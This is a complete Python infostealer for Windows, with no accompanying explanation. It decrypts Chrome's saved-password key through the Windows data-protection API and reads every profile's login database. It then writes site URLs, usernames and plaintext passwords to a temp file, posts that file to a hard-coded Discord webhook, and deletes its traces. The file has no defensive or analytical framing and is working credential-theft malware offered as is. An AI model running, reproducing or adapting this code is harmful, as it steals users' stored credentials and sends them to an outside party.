import os
import re
import sys
import json
import time
import base64
import sqlite3
import win32crypt
from getpass import getuser
from Cryptodome.Cipher import AES
import shutil
import requests
import tempfile

temp_dir = tempfile.gettempdir()

tmpdir = f"{temp_dir}"
tmpfile = os.path.join(tmpdir,getuser()+'.txt')
temp_file = open(tmpfile,'w')
CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))

def wait_for_internet(url="http://www.google.com", timeout=5, sleep_duration=5):
    while True:
        try:
            response = requests.get(url, timeout=timeout)
            if response.status_code == 200:
                return True
        except requests.RequestException:
            time.sleep(5)

wait_for_internet()

def get_secret_key():
    try:
        with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:]
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Chrome secretkey cannot be found")
        return None
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()
        return decrypted_pass
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
        return ""

def get_db_connection(chrome_path_login_db):
    try:
        print(chrome_path_login_db)
        shutil.copy2(chrome_path_login_db, "Loginvault.db") 
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Chrome database cannot be found")
        return None

def upload(file_path):
    url = 'https://discord.com/api/webhooks/1302583012566896740/tOB6sCsQIbv-rRD6hwmvMUWsypS9OJHlovD6PuvqSId4g-zAIW5qjq2grXBSFBr42iDJ'
    with open(file_path, "rb") as file:
        response = requests.post(url, files={"file": file})

if __name__ == '__main__':
    try:
        secret_key = get_secret_key()
        folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
        for folder in folders:
            chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder))
            conn = get_db_connection(chrome_path_login_db)
            if(secret_key and conn):
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for index,login in enumerate(cursor.fetchall()):
                    url = login[0]
                    username = login[1]
                    ciphertext = login[2]
                    if(url!="" and username!="" and ciphertext!=""):
                        decrypted_password = decrypt_password(ciphertext, secret_key)
                        print("Sequence: %d"%(index),file=temp_file)
                        print("URL: %s\nUser Name: %s\nPassword: %s\n"%(url,username,decrypted_password),file=temp_file)
                        print("*"*50,file=temp_file)
                cursor.close()
                conn.close()
                os.remove("Loginvault.db")
        temp_file.close()
        upload(tmpfile)
        os.remove(tmpfile)
    except IOError as e:
        print("[ERR] %s"%str(e))
